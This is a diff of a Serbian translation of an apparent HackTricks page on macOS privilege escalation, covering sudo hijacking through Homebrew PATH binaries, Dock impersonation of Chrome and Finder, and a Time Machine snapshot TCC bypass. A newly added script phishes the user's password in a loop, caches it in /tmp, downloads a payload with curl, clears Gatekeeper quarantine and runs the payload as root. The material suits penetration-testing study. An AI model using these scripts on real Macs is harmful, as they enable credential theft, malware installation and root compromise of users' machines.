@@ -4,7 +4,8 @@
 
 ## TCC Privilege Escalation
 
-Ako ste došli ovde tražeći TCC eskalaciju privilegija, idite na:
+Ako ste došli ovde tražeći TCC privilege escalation, idite na:
+
 
 {{#ref}}
 macos-security-protections/macos-tcc/
@@ -12,19 +13,20 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-Imajte na umu da **većina trikova o eskalaciji privilegija koji utiču na Linux/Unix će takođe uticati na MacOS** mašine. Tako da pogledajte:
+Imajte na umu da će **većina trikova vezanih za privilege escalation koji utiču na Linux/Unix** takođe uticati i na MacOS mašine. Dakle, pogledajte:
+
 
 {{#ref}}
 ../../linux-hardening/privilege-escalation/
 {{#endref}}
 
-## User Interaction
+## Interakcija sa korisnikom
 
 ### Sudo Hijacking
 
-Možete pronaći originalnu [Sudo Hijacking tehniku unutar posta o Linux eskalaciji privilegija](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).
+Možete pronaći originalnu [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).
 
-Međutim, macOS **održava** korisnikov **`PATH`** kada izvršava **`sudo`**. Što znači da bi drugi način da se postigne ovaj napad bio da se **otmu drugi binarni fajlovi** koje žrtva i dalje izvršava kada **pokreće sudo:**
+Međutim, macOS **održava** korisnikov **`PATH`** kada korisnik izvršava **`sudo`**. To znači da bi drugi način da se izvede ovaj napad bio da se **hijack other binaries** koje žrtva i dalje izvršava kada pokreće **sudo**:
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
 cat > /opt/homebrew/bin/ls <<EOF
@@ -39,17 +41,17 @@ chmod +x /opt/homebrew/bin/ls
 # victim
 sudo ls
 ```
-Napomena da korisnik koji koristi terminal verovatno ima **Homebrew instaliran**. Tako da je moguće preuzeti binarne datoteke u **`/opt/homebrew/bin`**.
+Imajte na umu da korisnik koji koristi terminal vrlo verovatno ima **Homebrew installed**. Dakle, moguće je preuzeti kontrolu nad binarnim fajlovima u **`/opt/homebrew/bin`**.
 
-### Imitacija Dock-a
+### Dock Impersonation
 
-Korišćenjem nekih **socijalnih inženjeringa** mogli biste **imitirati, na primer, Google Chrome** unutar dock-a i zapravo izvršiti svoj skript:
+Korišćenjem neke **social engineering** taktike možete, na primer, **impersonate Google Chrome** u Dock-u i zapravo izvršiti sopstveni skript:
 
 {{#tabs}}
 {{#tab name="Chrome Impersonation"}}
 Neki predlozi:
 
-- Proverite u Dock-u da li postoji Chrome, i u tom slučaju **uklonite** tu stavku i **dodajte** **lažnu** **Chrome stavku na istu poziciju** u Dock nizu.
+- Proverite u Dock-u da li postoji Chrome, i u tom slučaju **uklonite** tu stavku i **dodajte** **lažnu** **Chrome stavku na istoj poziciji** u Dock nizu.
 ```bash
 #!/bin/sh
 
@@ -122,13 +124,13 @@ killall Dock
 {{#endtab}}
 
 {{#tab name="Finder Impersonation"}}
-Nekoliko predloga:
+Some suggestions:
 
-- Ne **možete ukloniti Finder iz Dock-a**, tako da, ako planirate da ga dodate u Dock, možete staviti lažni Finder odmah pored pravog. Za to treba da **dodate lažni Finder unos na početak Dock niza**.
-- Druga opcija je da ga ne stavljate u Dock i samo ga otvorite, "Finder traži da kontroliše Finder" nije tako čudno.
-- Još jedna opcija za **eskalaciju na root bez traženja** lozinke sa užasnom porukom je da naterate Findera da stvarno traži lozinku za obavljanje privilegovane radnje:
-- Zatražite od Findera da kopira u **`/etc/pam.d`** novu **`sudo`** datoteku (Poruka koja traži lozinku će ukazati da "Finder želi da kopira sudo")
-- Zatražite od Findera da kopira novi **Authorization Plugin** (Možete kontrolisati ime datoteke tako da poruka koja traži lozinku ukazuje da "Finder želi da kopira Finder.bundle")
+- Ne možete da uklonite Finder iz Dock-a, pa ako planirate da ga dodate u Dock, možete postaviti lažnog Findera odmah pored pravog. Za ovo treba da **dodate unos lažnog Findera na početak Dock array-a**.
+- Druga opcija je da ga ne stavljate u Dock i samo ga otvorite — "Finder asking to control Finder" ne zvuči previše čudno.
+- Još jedna opcija da **escalate to root without asking** lozinku preko ružnog dijaloga jeste da naterate Finder da zaista zatraži lozinku da bi izvršio privilegovanu akciju:
+- Naredite Finderu da kopira u **`/etc/pam.d`** novi **`sudo`** fajl (Dijalog koji traži lozinku će pokazati "Finder wants to copy sudo")
+- Naredite Finderu da kopira novi **Authorization Plugin** (Možete kontrolisati ime fajla tako da dijalog koji traži lozinku pokaže "Finder wants to copy Finder.bundle")
 ```bash
 #!/bin/sh
 
@@ -201,12 +203,33 @@ killall Dock
 {{#endtab}}
 {{#endtabs}}
 
-## TCC - Eskalacija privilegija za root
+### Phishing putem upita za lozinku + ponovna upotreba sudo
 
-### CVE-2020-9771 - mount_apfs TCC zaobilaženje i eskalacija privilegija
+Malware često zloupotrebljava interakciju korisnika da bi **uhvatio lozinku koja omogućava sudo** i ponovo je programski koristio. Uobičajen tok:
 
-**Bilo koji korisnik** (čak i oni bez privilegija) može kreirati i montirati snapshot vremenske mašine i **pristupiti SVIM datotekama** tog snapshot-a.\
-**Jedina privilegija** koja je potrebna je da aplikacija koja se koristi (kao što je `Terminal`) ima **Pristup celom disku** (FDA) (`kTCCServiceSystemPolicyAllfiles`) koji mora odobriti administrator.
+1. Identifikuj prijavljenog korisnika koristeći `whoami`.
+2. **Petlja kroz zahteve za lozinku** dok `dscl . -authonly "$user" "$pw"` ne vrati uspeh.
+3. Keširaj akreditive (npr. `/tmp/.pass`) i izvršavaj privilegovane akcije sa `sudo -S` (lozinka preko stdin).
+
+Example minimal chain:
+```bash
+user=$(whoami)
+while true; do
+read -s -p "Password: " pw; echo
+dscl . -authonly "$user" "$pw" && break
+done
+printf '%s\n' "$pw" > /tmp/.pass
+curl -o /tmp/update https://example.com/update
+printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
+```
+Ukradena lozinka se potom može ponovo iskoristiti da **ukloni Gatekeeper karantin koristeći `xattr -c`**, kopira LaunchDaemons ili druge privilegovane datoteke, i pokrene dodatne faze bez interakcije.
+
+## TCC - Root Privilege Escalation
+
+### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
+
+**Bilo koji korisnik** (čak i neprivilegovani) može kreirati i mount-ovati Time Machine snapshot i **pristupiti SVIM datotekama** tog snapshot-a.\
+**Jedina privilegija** koja je potrebna je da aplikacija koja se koristi (npr. `Terminal`) ima **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), koju mora dodeliti admin.
 ```bash
 # Create snapshot
 tmutil localsnapshot
@@ -226,7 +249,7 @@ mkdir /tmp/snap
 # Access it
 ls /tmp/snap/Users/admin_user # This will work
 ```
-Detaljnije objašnjenje može se [**pronaći u originalnom izveštaju**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
+Detaljnije objašnjenje može se naći u [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
 
 ## Osetljive informacije
 
@@ -236,5 +259,9 @@ Ovo može biti korisno za eskalaciju privilegija:
 {{#ref}}
 macos-files-folders-and-binaries/macos-sensitive-locations.md
 {{#endref}}
+
+## Reference
+
+- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-Infostealer/)
 
 {{#include ../../banners/hacktricks-training.md}}
